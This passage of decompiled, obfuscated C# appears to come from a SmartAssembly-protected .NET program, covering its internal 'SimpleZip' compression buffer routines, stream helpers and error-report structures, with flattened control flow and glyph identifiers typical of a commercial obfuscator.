                  int index1 = ⴄ;
                  int num8 = (int) (byte) (this.Ⴀ.Ⴍ >> 8);
                  ⴃ1[index1] = (byte) num8;
                  num1 = 8;
                  continue;
                case 5:
                  byte[] ⴃ2 = this.Ⴃ;
                  SimpleZip.ႤႼ ⴄⴜ3 = this;
                  num4 = (ⴄ = ⴄⴜ3.Ⴀ.Ⴄ) + 1;
                  ⴄⴜ3.Ⴀ.Ⴄ = num4;
                  int index2 = ⴄ;
                  int ⴍ = (int) (byte) this.Ⴀ.Ⴍ;
                  ⴃ2[index2] = (byte) ⴍ;
                  num1 = 3;
                  continue;
                case 6:
                case 8:
                  SimpleZip.ႤႼ ⴄⴜ4 = this;
                  num6 = ⴄⴜ4.Ⴀ.Ⴍ >> 16;
                  ⴄⴜ4.Ⴀ.Ⴍ = num6;
                  num1 = 10;
                  continue;
                case 7:
                  goto label_11;
                case 10:
                  SimpleZip.ႤႼ ⴄⴜ5 = this;
                  num7 = ⴄⴜ5.Ⴀ.Ⴈ - 16;
                  ⴄⴜ5.Ⴀ.Ⴈ = num7;
                  num1 = 7;
                  continue;
                default:
                  SimpleZip.ႤႼ ⴄⴜ6 = this;
                  num2 = ⴄⴜ6.Ⴀ.Ⴍ | (uint) (Ⴃ << this.Ⴀ.Ⴈ);
                  ⴄⴜ6.Ⴀ.Ⴍ = num2;
                  num1 = 2;
                  continue;
              }
            }
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴄ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o3 = (ValueType) Ⴃ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴄ;
            StackFrameHelper.CreateException4(ex, (object) o1, (object) this, (object) o3, (object) o4);
            throw;
          }
label_11:
          switch (1)
          {
          }
        }
        catch (Exception ex)
        {
          int num9;
          object[] objects = new object[12]
          {
            (object) ⴄ,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) num6,
            (object) num7,
            (object) num1,
            (object) num9,
            (object) this,
            (object) Ⴃ,
            (object) Ⴄ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      [SpecialName]
      public bool Ⴐ()
      {
        try
        {
          bool flag;
          try
          {
            flag = this.Ⴀ.Ⴄ == 0;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return flag;
        }
        catch (Exception ex)
        {
          bool flag;
          // ISSUE: variable of a boxed type
          __Boxed<bool> o1 = (ValueType) flag;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public int Ⴅ(byte[] Ⴍ, int Ⴈ, int Ⴓ)
      {
        int num1;
        int ⴄ;
        int num2;
        uint num3;
        int num4;
        int num5;
        int num6;
        int num7;
        int num8;
        try
        {
          try
          {
            num1 = 10;
            while (true)
            {
              switch (num1)
              {
                case 0:
                case 8:
                  num1 = 5;
                  continue;
                case 1:
                  Ⴓ = this.Ⴀ.Ⴄ - this.Ⴀ.Ⴐ;
                  num1 = 7;
                  continue;
                case 2:
                case 11:
                  num1 = Ⴓ <= this.Ⴀ.Ⴄ - this.Ⴀ.Ⴐ ? 14 : 1;
                  continue;
                case 3:
                  SimpleZip.ႤႼ ⴄⴜ1 = this;
                  num7 = ⴄⴜ1.Ⴀ.Ⴐ + Ⴓ;
                  ⴄⴜ1.Ⴀ.Ⴐ = num7;
                  num1 = 12;
                  continue;
                case 4:
                  byte[] ⴃ = this.Ⴃ;
                  SimpleZip.ႤႼ ⴄⴜ2 = this;
                  num2 = (ⴄ = ⴄⴜ2.Ⴀ.Ⴄ) + 1;
                  ⴄⴜ2.Ⴀ.Ⴄ = num2;
                  int index = ⴄ;
                  int ⴍ = (int) (byte) this.Ⴀ.Ⴍ;
                  ⴃ[index] = (byte) ⴍ;
                  goto case 0;
                case 5:
                  SimpleZip.ႤႼ ⴄⴜ3 = this;
                  num3 = ⴄⴜ3.Ⴀ.Ⴍ >> 8;
                  ⴄⴜ3.Ⴀ.Ⴍ = num3;
                  num1 = 9;
                  continue;
                case 6:
                  num5 = 0;
                  this.Ⴀ.Ⴐ = num5;
                  num6 = 0;
                  this.Ⴀ.Ⴄ = num6;
                  num1 = 12;
                  continue;
                case 7:
                  AppPathFinder.Ⴍ((Array) this.Ⴃ, this.Ⴀ.Ⴐ, (Array) Ⴍ, Ⴈ, Ⴓ, 266, 272);
                  num1 = 6;
                  continue;
                case 9:
                  SimpleZip.ႤႼ ⴄⴜ4 = this;
                  num4 = ⴄⴜ4.Ⴀ.Ⴈ - 8;
                  ⴄⴜ4.Ⴀ.Ⴈ = num4;
                  num1 = 11;
                  continue;
                case 12:
                  goto label_13;
                case 14:
                  AppPathFinder.Ⴍ((Array) this.Ⴃ, this.Ⴀ.Ⴐ, (Array) Ⴍ, Ⴈ, Ⴓ, 506, 480);
                  num1 = 3;
                  continue;
                default:
                  num1 = this.Ⴀ.Ⴈ < 8 ? 11 : 4;
                  continue;
              }
            }
label_13:
            num8 = Ⴓ;
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o1 = (ValueType) ⴄ;
            byte[] o3 = Ⴍ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o4 = (ValueType) Ⴈ;
            // ISSUE: variable of a boxed type
            __Boxed<int> o5 = (ValueType) Ⴓ;
            StackFrameHelper.CreateException5(ex, (object) o1, (object) this, (object) o3, (object) o4, (object) o5);
            throw;
          }
          switch (1)
          {
            default:
              return num8;
          }
        }
        catch (Exception ex)
        {
          int num9;
          object[] objects = new object[14]
          {
            (object) ⴄ,
            (object) num8,
            (object) num2,
            (object) num3,
            (object) num4,
            (object) num5,
            (object) num6,
            (object) num7,
            (object) num1,
            (object) num9,
            (object) this,
            (object) Ⴍ,
            (object) Ⴈ,
            (object) Ⴓ
          };
          StackFrameHelper.CreateExceptionN(ex, objects);
          throw;
        }
      }

      public ႤႼ()
      {
        this.Ⴀ.Ⴐ = 0;
        this.Ⴀ.Ⴄ = 0;
        this.Ⴀ.Ⴍ = 0U;
        this.Ⴀ.Ⴈ = 0;
        // ISSUE: explicit constructor call
        base.\u002Ector();
        try
        {
        }
        catch (Exception ex)
        {
          int num1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num2;
          uint num3;
          // ISSUE: variable of a boxed type
          __Boxed<uint> o3 = (ValueType) num3;
          int num4;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) num4;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) this);
          throw;
        }
      }

      static ႤႼ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }

      internal static void Ⴄ([In] Exception obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
          num1 = 0;
          while (true)
          {
            switch (num1)
            {
              case 1:
                goto label_8;
              case 2:
              case 5:
                goto label_7;
              case 3:
                goto label_10;
              case 4:
                num1 = 0;
                continue;
              default:
                int num2;
                switch (obj2 ^ obj1)
                {
                  case 102:
                    num2 = 5;
                    break;
                  default:
                    num2 = 4;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_8:
          return;
label_10:
          return;
label_7:
          ProjectData.SetProjectError(obj0);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          Exception o3 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj2;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      internal static bool Ⴀ([In] DateTime obj0, [In] DateTime obj1, [In] int obj2, [In] int obj3)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj3 ^ obj2)
          {
            case 7:
              num2 = 5;
              break;
            default:
              num2 = 3;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
              case 1:
                goto label_3;
              case 3:
                num1 = 1;
                continue;
              case 4:
                num1 = 1;
                continue;
              case 5:
              case 6:
                goto label_8;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႼ.Ⴀ);
                num1 = 1;
                continue;
            }
          }
label_8:
          return obj0 > obj1;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          // ISSUE: variable of a boxed type
          __Boxed<DateTime> o2 = (ValueType) obj0;
          // ISSUE: variable of a boxed type
          __Boxed<DateTime> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj3;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      internal static object Ⴜ([In] ResourceManager obj0, [In] string obj1, [In] int obj2, [In] int obj3)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj3 ^ obj2)
          {
            case 126:
              num2 = 5;
              break;
            default:
              num2 = 2;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 1:
              case 5:
                goto label_8;
              case 2:
              case 3:
                num1 = 4;
                continue;
              case 4:
                goto label_3;
              case 7:
                num1 = 4;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႤႼ.Ⴜ);
                num1 = 4;
                continue;
            }
          }
label_8:
          return obj0.GetObject(obj1);
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          ResourceManager o2 = obj0;
          string o3 = obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj3;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }
    }

    internal sealed class ႭႰ : MemoryStream
    {
      public void Ⴃ(int Ⴈ)
      {
        try
        {
          try
          {
            FatalExceptionEventArgs.Ⴍ((Stream) this, (byte) (Ⴈ & (int) byte.MaxValue), 354, 343);
            FatalExceptionEventArgs.Ⴍ((Stream) this, (byte) (Ⴈ >> 8 & (int) byte.MaxValue), 748, 729);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) Ⴈ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) Ⴈ;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }

      public void Ⴄ(int Ⴈ)
      {
        try
        {
          try
          {
            this.Ⴃ(Ⴈ);
            this.Ⴃ(Ⴈ >> 16);
          }
          catch (Exception ex)
          {
            // ISSUE: variable of a boxed type
            __Boxed<int> o2 = (ValueType) Ⴈ;
            StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
            throw;
          }
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) Ⴈ;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }

      public int Ⴗ()
      {
        try
        {
          int num;
          try
          {
            num = Ⴈ.Ⴗ.Ⴍ((Stream) this, 430, 496) | Ⴈ.Ⴗ.Ⴍ((Stream) this, 304, 366) << 8;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return num;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public int Ⴅ()
      {
        try
        {
          int num;
          try
          {
            num = this.Ⴗ() | this.Ⴗ() << 16;
          }
          catch (Exception ex)
          {
            StackFrameHelper.CreateException1(ex, (object) this);
            throw;
          }
          return num;
        }
        catch (Exception ex)
        {
          int num;
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num;
          StackFrameHelper.CreateException2(ex, (object) o1, (object) this);
          throw;
        }
      }

      public ႭႰ()
      {
        try
        {
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException1(ex, (object) this);
          throw;
        }
      }

      public ႭႰ(byte[] Ⴅ)
        : base(Ⴅ, false)
      {
        try
        {
        }
        catch (Exception ex)
        {
          byte[] o2 = Ⴅ;
          StackFrameHelper.CreateException2(ex, (object) this, (object) o2);
          throw;
        }
      }

      static ႭႰ()
      {
        try
        {
          SmartAssembly.SmartUsageCore.DoNotPruneAttribute.ႰႣ();
        }
        catch (Exception ex)
        {
          StackFrameHelper.CreateException0(ex);
          throw;
        }
      }

      internal static System.Type Ⴓ([In] object obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 13:
              num2 = 6;
              break;
            default:
              num2 = 2;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 1:
              case 3:
              case 6:
                goto label_8;
              case 2:
                num1 = 5;
                continue;
              case 4:
                num1 = 5;
                continue;
              case 5:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႰ.Ⴓ);
                num1 = 5;
                continue;
            }
          }
label_8:
          return obj0.GetType();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          object o2 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, o2, (object) o3, (object) o4);
          throw;
        }
      }

      internal static void Ⴐ([In] XmlWriter obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
          num1 = 1;
          while (true)
          {
            switch (num1)
            {
              case 2:
                goto label_7;
              case 3:
              case 5:
                num1 = 1;
                continue;
              case 4:
                goto label_10;
              default:
                int num2;
                switch (obj2 ^ obj1)
                {
                  case 92:
                    num2 = 2;
                    break;
                  case 93:
                    goto label_8;
                  default:
                    num2 = 5;
                    break;
                }
                num1 = num2;
                continue;
            }
          }
label_10:
          return;
label_7:
          obj0.WriteStartDocument();
          return;
label_8:
          obj0.WriteEndDocument();
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          int num3;
          // ISSUE: variable of a boxed type
          __Boxed<int> o2 = (ValueType) num3;
          XmlWriter o3 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o5 = (ValueType) obj2;
          StackFrameHelper.CreateException5(ex, (object) o1, (object) o2, (object) o3, (object) o4, (object) o5);
          throw;
        }
      }

      internal static Size Ⴈ([In] Control obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 107:
              num2 = 4;
              break;
            default:
              num2 = 5;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 2:
              case 5:
                num1 = 7;
                continue;
              case 3:
              case 6:
                num1 = 7;
                continue;
              case 4:
                goto label_8;
              case 7:
                goto label_3;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႰ.Ⴈ);
                num1 = 7;
                continue;
            }
          }
label_8:
          return obj0.ClientSize;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          Control o2 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }

      internal static bool Ⴀ([In] FieldInfo obj0, [In] int obj1, [In] int obj2)
      {
        int num1;
        try
        {
label_3:
          int num2;
          switch (obj2 ^ obj1)
          {
            case 81:
              num2 = 7;
              break;
            default:
              num2 = 6;
              break;
          }
          num1 = num2;
          while (true)
          {
            switch (num1)
            {
              case 0:
                goto label_3;
              case 1:
              case 7:
                goto label_8;
              case 2:
              case 5:
                num1 = 0;
                continue;
              case 6:
                num1 = 0;
                continue;
              default:
                // ISSUE: method reference
                RuntimeMethodHandle runtimeMethodHandle = __methodref (SimpleZip.ႭႰ.Ⴀ);
                num1 = 0;
                continue;
            }
          }
label_8:
          return obj0.IsInitOnly;
        }
        catch (Exception ex)
        {
          // ISSUE: variable of a boxed type
          __Boxed<int> o1 = (ValueType) num1;
          FieldInfo o2 = obj0;
          // ISSUE: variable of a boxed type
          __Boxed<int> o3 = (ValueType) obj1;
          // ISSUE: variable of a boxed type
          __Boxed<int> o4 = (ValueType) obj2;
          StackFrameHelper.CreateException4(ex, (object) o1, (object) o2, (object) o3, (object) o4);
          throw;
        }
      }
    }

    [StructLayout(LayoutKind.Explicit, Size = 1754, Pack = 1)]
    private struct Ⴃ
    {
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴀ
    {
      internal byte[] Ⴓ;
      internal int Ⴄ;
      internal int Ⴈ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct Ⴜ
    {
      internal ReportSender Ⴅ;
      internal byte[] Ⴗ;
      internal Ⴈ.ႷႷ Ⴐ;
    }

    [StructLayout(LayoutKind.Auto)]
    internal struct ႭႳ
    {
      internal SendingReportStep Ⴄ;
      internal bool Ⴐ;
      internal string Ⴃ;
      internal string Ⴍ;
    }

    [StructLayout(LayoutKind.Explicit, Size = 16, Pack = 1)]
    private struct ႷႭ
    {
    }
  }
}
